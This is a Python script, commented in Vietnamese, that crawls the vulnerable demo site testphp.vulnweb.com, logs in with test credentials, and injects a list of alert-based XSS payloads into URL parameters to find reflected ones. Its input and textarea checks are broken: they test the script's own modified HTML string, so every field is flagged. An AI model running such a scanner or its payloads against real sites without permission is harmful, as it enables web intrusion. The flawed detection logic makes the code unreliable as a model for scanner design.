import requests
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
import colorama
from colorama import Fore, Style
from collections import deque
import threading
import logging

# Khởi tạo colorama để sử dụng màu sắc trong console
colorama.init()

# Cấu hình logging để ghi lại thông tin vào tệp 'xss_scan_results.log'
logging.basicConfig(filename='xss_scan_results.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Tập hợp để theo dõi các URL đã được thăm
visited_urls = set()
# Khóa để đảm bảo an toàn khi truy cập 'visited_urls' trong môi trường đa luồng
visited_urls_lock = threading.Lock()

payloads = [
    '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '"><img src=x onerror=alert("XSS")>',
    'javascript:alert("XSS")',
    '<body onload=alert("XSS")>',
    '"><svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\');">',
    '\'"--><script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<input type="text" value="<script>alert(\'XSS\')</script">',
]

def extract_internal_links(url, session):
    """
    Hàm trích xuất các liên kết nội bộ từ một URL nhất định
    """
    internal_links = set()
    try:
        response = session.get(url)
        if response.status_code == 200:
            page_content = response.text
            base_url = get_base_url(url)
            # Tìm tất cả các liên kết từ thẻ href
            links = re.findall(r'href=[\'"](.*?)[\'"]', page_content, flags=re.IGNORECASE)
            for link in links:
                # Chuyển đổi liên kết tương đối thành liên kết tuyệt đối
                absolute_link = urljoin(base_url, link.strip())
                # Chỉ thêm các liên kết nội bộ
                if is_same_domain(absolute_link, base_url):
                    internal_links.add(absolute_link)
    except requests.RequestException as e:
        print(f"{Fore.YELLOW}Cảnh báo: Không thể truy xuất {url}: {e}{Style.RESET_ALL}")
    return internal_links

def get_base_url(url):
    """
    Hàm lấy base URL từ một URL đầy đủ
    """
    parsed_url = urlparse(url)
    return f"{parsed_url.scheme}://{parsed_url.netloc}"

def is_same_domain(url, base_url):
    """
    Hàm kiểm tra xem hai URL có cùng domain hay không
    """
    parsed_url = urlparse(url)
    parsed_base_url = urlparse(base_url)
    return parsed_url.netloc == parsed_base_url.netloc

def perform_xss_checks_input(url, input_fields, payloads):
    """
    Hàm kiểm tra XSS trên các thẻ input
    """
    for input_field in input_fields:
        vulnerable = False
        for payload in payloads:
            # Thay thế giá trị của thẻ input bằng payload
            modified_input_field = re.sub(r'value\s*?=\s*?".*?"', f'value="{payload}"', input_field, flags=re.IGNORECASE)
            modified_input_field = re.sub(r'value\s*?=\s*?\'.*?\'', f"value='{payload}'", modified_input_field, flags=re.IGNORECASE)
            modified_input_field = re.sub(r'value\s*?=\s*?{.*?}', f'value={payload}', modified_input_field, flags=re.IGNORECASE)
            if payload in modified_input_field:
                vulnerable = True
                break
        if vulnerable:
            print(f'{Fore.RED}NGUY HIỂM{Style.RESET_ALL}: {input_field} trong {url} với payload: {payload}')
            logging.info(f'NGUY HIỂM: {input_field} trong {url} với payload: {payload}')
        else:
            print(f'AN TOÀN: {input_field} trong {url}')

def perform_xss_checks_textarea(url, textarea_fields, payloads):
    """
    Hàm kiểm tra XSS trên các thẻ textarea
    """
    for textarea_field in textarea_fields:
        vulnerable = False
        for payload in payloads:
            # Thay thế nội dung của thẻ textarea bằng payload
            modified_textarea_field = re.sub(r'>(.*?)</textarea>', f'>{payload}</textarea>', textarea_field, flags=re.IGNORECASE)
            if payload in modified_textarea_field:
                vulnerable = True
                break
        if vulnerable:
            print(f'{Fore.RED}NGUY HIỂM{Style.RESET_ALL}: {textarea_field} trong {url} | payload: {payload}')
            logging.info(f'NGUY HIỂM: {textarea_field} trong {url} | payload: {payload}')
        else:
            print(f'An toàn: {textarea_field} trong {url}')

def inject_payloads_to_url(url, payloads):
    """
    Hàm thêm payload vào tham số URL và kiểm tra phản hồi
    """
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    for param in query_params:
        for payload in payloads:
            modified_params = query_params.copy()
            modified_params[param] = payload
            modified_query = urlencode(modified_params, doseq=True)
            modified_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{modified_query}"

            try:
                response = requests.get(modified_url, headers={'User-Agent': 'Mozilla/5.0'})
                if payload in response.text:
                    print(f'{Fore.RED}NGUY HIỂM{Style.RESET_ALL}: {param} trong {modified_url} với payload: {payload}')
                    logging.info(f'NGUY HIỂM: {param} trong {modified_url} với payload: {payload}')
                else:
                    print(f'AN TOÀN: {param} trong {modified_url}')
            except requests.RequestException as e:
                print(f"{Fore.YELLOW}Cảnh báo: Không thể truy xuất {modified_url}: {e}{Style.RESET_ALL}")

def login(session, login_url, username, password):
    """
    Hàm đăng nhập vào trang web
    """
    payload = {
        'uname': username,
        'pass': password,
        'login': 'login'
    }
    try:
        response = session.post(login_url, data=payload)
        if response.status_code == 200 and "Logout" in response.text:  # Điều kiện này có thể cần thay đổi tùy thuộc vào trang web
            print(f"{Fore.GREEN}Đăng nhập thành công{Style.RESET_ALL}")
            return True
        else:
            print(f"{Fore.RED}Đăng nhập thất bại{Style.RESET_ALL}")
            return False
    except requests.RequestException as e:
        print(f"{Fore.RED}Lỗi khi đăng nhập: {e}{Style.RESET_ALL}")
        return False

def perform_xss_checks(url, login_url=None, username=None, password=None, max_depth=3):
    """
    Hàm kiểm tra XSS trên các trang web, bắt đầu từ một URL nhất định và đệ quy tới các liên kết nội bộ
    """
    session = requests.Session()

    if login_url and username and password:
        if not login(session, login_url, username, password):
            return

    # Hàng đợi hai đầu để duyệt qua các trang
    queue = deque([(url, 0)])
    visited_urls.add(url)

    while queue:
        # lấy url hiện tại và độ sâu của hàm đợi
        current_url, depth = queue.popleft()
        if depth > max_depth: # nếu độ sâu vượt giới hạn tối đa, bỏ qua url
            continue

        try:
            response = session.get(current_url, headers={'User-Agent': 'Mozilla/5.0'}) #gửi yêu cầu HTTP GET đến URL hiện tại
            if response.status_code == 200: #yêu cầu thành công
                page_content = response.text #lấy nội dung của trang web
                # Tìm tất cả các thẻ input và textarea
                input_fields = re.findall(r'<input.*?type=["\']text["\'].*?>', page_content, flags=re.IGNORECASE)
                textarea_fields = re.findall(r'<textarea.*?>.*?</textarea>', page_content, flags=re.IGNORECASE)
                # Kiểm tra XSS trên các thẻ input và textarea
                perform_xss_checks_input(current_url, input_fields, payloads)
                perform_xss_checks_textarea(current_url, textarea_fields,payloads)
                # Kiểm tra XSS bằng cách chèn payload vào tham số URL
                inject_payloads_to_url(current_url, payloads)
                # Trích xuất các liên kết nội bộ
                internal_links = extract_internal_links(current_url, session)
                for link in internal_links:
                    with visited_urls_lock:
                        if link not in visited_urls:
                            visited_urls.add(link)
                            queue.append((link, depth + 1))
        except requests.RequestException as e: #nếu xảy ra lỗi khi gửi yêu cầu HTTP, in ra cảnh báo
            print(f"{Fore.YELLOW}Cảnh báo: Không thể truy xuất {current_url}: {e}{Style.RESET_ALL}")

# Nhận URL và thông tin đăng nhập từ người dùng và bắt đầu kiểm tra XSS
url = "http://testphp.vulnweb.com/"
login_url = "http://testphp.vulnweb.com/userinfo.php"
username = "test"
password = "test"

perform_xss_checks(url, login_url, username, password)
